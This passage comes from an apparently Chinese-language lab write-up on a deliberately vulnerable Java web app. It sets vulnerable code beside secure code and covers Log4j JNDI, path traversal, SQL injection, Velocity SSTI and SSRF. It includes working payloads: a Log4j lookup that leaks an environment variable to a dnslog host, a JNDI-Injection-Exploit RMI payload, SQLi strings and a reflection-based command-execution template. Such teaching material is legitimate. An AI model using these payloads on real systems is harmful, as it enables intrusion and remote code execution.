class="hljs-comment">//使用 logger.error(token) 将用户输入写入日志。如果 Log4j 使用的是受影响版本，这里的 $&#123;jndi:ldap://...&#125; 将被解析执行，触发远程加载类，导致 RCE</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">log4j</span><span class="hljs-params">(String token)</span> &#123;<br>       logger.error(token);<br>       <span class="hljs-keyword">return</span> token;<br>   &#125;<br></code></pre></td></tr></table></figure><p>POC1:</p><p><code>/log4j?token=${jndi:ldap://${env:OS}.44wodg.dnslog.cn}</code></p><p><strong>直接访问会对非法字符过滤，需要 url 编码后注入</strong></p><p><code>/log4j?token=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Benv%3AOS%7D.44wodg.dnslog.cn%7D</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938049.png" alt="20250725141100248"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938015.png" alt="20250725141125185"></p><p>POC2:</p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot;</code></p><p><code>rmi://169.254.39.1:1099/ihe2v1</code></p><p><code>${jndi:rmi://169.254.39.1:1099/ihe2v1}</code></p><p><code>/log4j?token=${jndi:rmi://169.254.39.1:1099/ihe2v1}</code></p><p><code>url 编码：/log4j?token=%24%7Bjndi%3Armi%3A%2F%2F169.254.39.1%3A1099%2Fihe2v1%7D</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939169.png" alt="20250725141328166"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939335.png" alt="20250725141333552"></p><h2 id="PathTraversal"><a href="#PathTraversal" class="headerlink" title="PathTraversal"></a>PathTraversal</h2><p>没有对文件路径做任何过滤，攻击者可以访问任意文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939585.png" alt="20250725142845129"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939910.png" alt="20250725142909337"></p><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="1-jdbc-vuln"><a href="#1-jdbc-vuln" class="headerlink" title="1.&#x2F;jdbc&#x2F;vuln"></a>1.&#x2F;jdbc&#x2F;vuln</h3><p>注入点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_sqli_vul</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>    ...<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>url:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/sqli/</span>jdbc/vuln?username=joycho<span class="hljs-string">u&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940681.png" alt="20250725132643238"></p><h3 id="2-jdbc-sec"><a href="#2-jdbc-sec" class="headerlink" title="2.&#x2F;jdbc&#x2F;sec"></a>2.&#x2F;jdbc&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/sec&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_sqli_sec</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>...<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = ?&quot;</span>;<br>    ...<br>&#125;    <br></code></pre></td></tr></table></figure><p>采用预编译，自动进行了转义，安全</p><h3 id="3-jdbc-ps-vuln"><a href="#3-jdbc-ps-vuln" class="headerlink" title="3.&#x2F;jdbc&#x2F;ps&#x2F;vuln"></a>3.&#x2F;jdbc&#x2F;ps&#x2F;vuln</h3><blockquote><p><code>PreparedStatement</code> 是 Java JDBC 提供的 <strong>预编译 SQL 语句执行器</strong>，用于安全执行 SQL 查询，<strong>防止 SQL 注入</strong>。</p><p><code>PreparedStatement</code> 是 <code>java.sql</code> 包中的一个接口，继承自 <code>Statement</code>。与普通的 <code>Statement</code> 相比，它可以使用 <code>?</code> 占位符来动态绑定参数，而不是直接拼接 SQL 字符串。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_ps_vuln</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>...<br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>错误使用 PreparedStatement , 虽然用的是 <code>PreparedStatement</code>，但 SQL 已拼接完成，还是有注入风险。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 正确使用范式 </span><br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql); <br>st.setString(<span class="hljs-number">1</span>,  username);  <span class="hljs-comment">// 参数绑定 </span><br></code></pre></td></tr></table></figure><p>url:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/sqli/</span>jdbc<span class="hljs-regexp">/ps/</span>vuln?username=joycho<span class="hljs-string">u&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940290.png" alt="20250725133408711"></p><h3 id="4-mybatis-vuln01"><a href="#4-mybatis-vuln01" class="headerlink" title="4.&#x2F;mybatis&#x2F;vuln01"></a>4.&#x2F;mybatis&#x2F;vuln01</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/vuln01&quot;)</span><br>   <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>       <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln01(username);<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln01</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/sqli/my</span>batis/vuln01?username=admin<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>返回数据库中所有用户</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940609.png" alt="20250725134006587"></p><h3 id="5-mybatis-vuln02"><a href="#5-mybatis-vuln02" class="headerlink" title="5.&#x2F;mybatis&#x2F;vuln02"></a>5.&#x2F;mybatis&#x2F;vuln02</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/vuln02&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln02</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>        <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln02(username);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln02</span><span class="hljs-params">(String username)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln02&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>        select * from users where username like &#x27;%$&#123;_parameter&#125;%&#x27;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML 配置中拼接 like + <code>${}</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">/sqli/mybatis/vuln02?username=<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>-&gt;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span> OR <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940734.png" alt="20250725134316209"></p><h3 id="6-mybatis-orderby-vuln03"><a href="#6-mybatis-orderby-vuln03" class="headerlink" title="6.&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>6.&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/orderby/vuln03&quot;)</span><br>   <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln03</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> &#123;<br>       <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln03(sort);<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln03</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;order&quot;)</span> String order)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>       select * from users<br>       <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;order != null&quot;</span>&gt;</span><br>           order by $&#123;order&#125; asc<br>       <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ORDER BY 拼接排序字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli/mybatis/orderby/vuln03?sort=id <span class="hljs-keyword">desc</span><span class="hljs-comment">--+</span><br>-&gt;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">desc</span><span class="hljs-comment">--+ asc</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940380.png" alt="20250725134556658"></p><h3 id="7-mybatis-sec01"><a href="#7-mybatis-sec01" class="headerlink" title="7.&#x2F;mybatis&#x2F;sec01"></a>7.&#x2F;mybatis&#x2F;sec01</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec01&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findByUserName(username);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br>User <span class="hljs-title function_">findByUserName</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><h3 id="8-mybatis-sec02"><a href="#8-mybatis-sec02" class="headerlink" title="8.&#x2F;mybatis&#x2F;sec02"></a>8.&#x2F;mybatis&#x2F;sec02</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec02&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec02</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;id&quot;)</span> Integer id)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findById(id);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">findById</span><span class="hljs-params">(Integer id)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findById&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users where id = #&#123;id&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="9-mybatis-sec03"><a href="#9-mybatis-sec03" class="headerlink" title="9.&#x2F;mybatis&#x2F;sec03"></a>9.&#x2F;mybatis&#x2F;sec03</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec03&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec03</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.OrderByUsername();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">OrderByUsername</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;OrderByUsername&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users order by id asc limit 1<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="10-mybatis-orderby-sec04"><a href="#10-mybatis-orderby-sec04" class="headerlink" title="10.&#x2F;mybatis&#x2F;orderby&#x2F;sec04"></a>10.&#x2F;mybatis&#x2F;orderby&#x2F;sec04</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/orderby/sec04&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisOrderBySec04</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln03</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;order&quot;)</span> String order)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users<br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;order != null&quot;</span>&gt;</span><br>        order by $&#123;order&#125; asc<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI（Server-Side Template Injection）就是服务器端模板注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941162.png" alt="20250726105655246"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/velocity&quot;)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">velocity</span><span class="hljs-params">(String template)</span> &#123;<br>       Velocity.init();<br><br>       <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br><br>       context.put(<span class="hljs-string">&quot;author&quot;</span>, <span class="hljs-string">&quot;Elliot A.&quot;</span>);<br>       context.put(<span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;217 E Broadway&quot;</span>);<br>       context.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;555-1337&quot;</span>);<br><br>       <span class="hljs-comment">//对用户传入的 template 无过滤直接传入 Velocity.evaluate 执行，</span><br>       <span class="hljs-type">StringWriter</span> <span class="hljs-variable">swOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>       Velocity.evaluate(context, swOut, <span class="hljs-string">&quot;test&quot;</span>, template);<br>   &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/ssti/velocity?template=#set($e=<span class="hljs-string">&quot;e&quot;</span>);$e.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,null).invoke(null,null).exec(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/ssti/velocity?template=%<span class="hljs-number">23</span>set($e=%<span class="hljs-number">22</span>e%<span class="hljs-number">22</span>);$e.getClass().forName(%<span class="hljs-number">22</span>java.lang.Runtime%<span class="hljs-number">22</span>).getMethod(%<span class="hljs-number">22</span>getRuntime%<span class="hljs-number">22</span>,null).invoke(null,null).exec(%<span class="hljs-number">22</span>calc.exe%<span class="hljs-number">22</span>)<br><br></code></pre></td></tr></table></figure><ol><li><code>#set($e=&quot;e&quot;)</code></li></ol><p>Velocity 模板语言中的变量定义。创建一个变量 <code>$e</code>，值为字符串 <code>&quot;e&quot;</code>。后面我们会用 <code>$e.getClass()</code> 来获取它的 <code>Class</code> 对象，从而进入 Java 反射</p><ol start="2"><li><code>$e.getClass()</code></li></ol><p><code>$e</code> 是字符串 <code>&quot;e&quot;</code>，调用 <code>.getClass()</code> 得到的是：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">java.lang.<span class="hljs-type">String</span>.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>得到了 <code>Class&lt;java.lang.String&gt;</code>，可以调用其 <code>forName()</code> 静态方法</p><ol start="3"><li><code>.forName(&quot;java.lang.Runtime&quot;)</code></li></ol><p>通过反射加载 <code>java.lang.Runtime</code> 类：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br></code></pre></td></tr></table></figure><p>返回 <code>java.lang.Runtime.class</code>，可以继续调用它的方法</p><ol start="4"><li><code>.getMethod(&quot;getRuntime&quot;, null)</code></li></ol><p>获取 <code>Runtime</code> 类的静态方法 <code>getRuntime()</code>：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.<span class="hljs-keyword">class</span>.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>)<br></code></pre></td></tr></table></figure><p><code>getMethod()</code> 返回一个 <code>Method</code> 对象，准备执行它</p><ol start="5"><li><code>.invoke(null, null)</code></li></ol><p>执行静态方法 <code>getRuntime()</code>：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.getRuntime()<br></code></pre></td></tr></table></figure><p>得到了当前 JVM 的 <code>Runtime</code> 实例，具备执行命令的能力</p><ol start="6"><li><code>.exec(&quot;calc.exe&quot;)</code></li></ol><p>最终执行命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br></code></pre></td></tr></table></figure><p>在 Windows 上，打开计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941658.png" alt="20250726105045484"></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p><img src="https://gitee.com/xvshifu/pic-go/raw/master/img/20250726112359849.png" alt="image-20250726112359793"></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">URLConnectionVuln</span><span class="hljs-params">(String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> HttpUtils.URLConnection(url);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">URLConnection</span><span class="hljs-params">(String url)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//没有校验协议和主机，对任意协议都可以访问</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>        <span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(urlConnection.getInputStream())); <span class="hljs-comment">//send request</span><br>        String inputLine;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">while</span> ((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) 